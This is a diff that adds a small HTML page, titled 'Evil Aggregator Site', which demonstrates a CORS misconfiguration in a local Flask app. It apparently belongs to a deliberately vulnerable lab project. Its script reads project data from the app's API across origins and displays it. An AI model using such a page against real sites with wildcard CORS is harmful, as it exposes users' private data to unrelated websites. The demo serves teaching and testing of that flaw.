@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head><title>Evil Aggregator Site</title></head>
+<body>
+    <h1>Scraped data from someone else's CRM:</h1>
+    <pre id="output">loading...</pre>
+
+    <script>
+        // VULN-13 demo: this script runs on a page that is NOT part of the
+        // Flask app (opened via file:// or a different port), representing
+        // a completely unrelated website. Because /api/projects/<id> sends
+        // Access-Control-Allow-Origin: *, this fetch() succeeds AND the
+        // browser lets this foreign script read the response body -- normal
+        // Same-Origin Policy would otherwise block that read even if the
+        // request itself went through.
+        fetch("http://127.0.0.1:5000/api/projects/1")
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById("output").textContent =
+                    JSON.stringify(data, null, 2);
+            })
+            .catch(err => {
+                document.getElementById("output").textContent =
+                    "Blocked by CORS (this is what SHOULD happen once fixed): " + err;
+            });
+    </script>
+</body>
+</html>
